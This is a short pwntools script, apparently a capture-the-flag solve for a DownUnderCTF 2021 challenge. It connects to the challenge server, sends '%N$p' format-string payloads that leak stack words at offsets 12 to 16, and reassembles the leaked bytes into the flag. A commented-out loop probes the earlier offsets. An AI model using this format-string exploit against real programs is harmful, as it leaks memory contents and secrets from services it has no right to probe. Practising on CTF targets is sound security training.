from pwn import *

io = remote("pwn-2021.duc.tf", 31918)
io.recv()

# find flag on stack
#for i in range(1, 20):
#    io.sendline(f"%{i}$p".encode())
#    res = io.recv().decode()
#    leak = res.split("\n")[1].split(" ")[-1]
#
#    if "0x" in leak:
#        leak = bytes.fromhex(leak.lstrip("0x").zfill(16))
#        print(f"{i}: {leak}")

# retrieve flag
flag = b""
for i in range(12, 17):
    io.sendline(f"%{i}$p".encode())
    res = io.recv().decode()
    leak = res.split("\n")[1].split(" ")[-1]

    if "0x" in leak:
        piece = bytes.fromhex(leak.lstrip("0x").zfill(16))
        flag += bytes(reversed(piece.lstrip(b"\x00")))

print(flag)
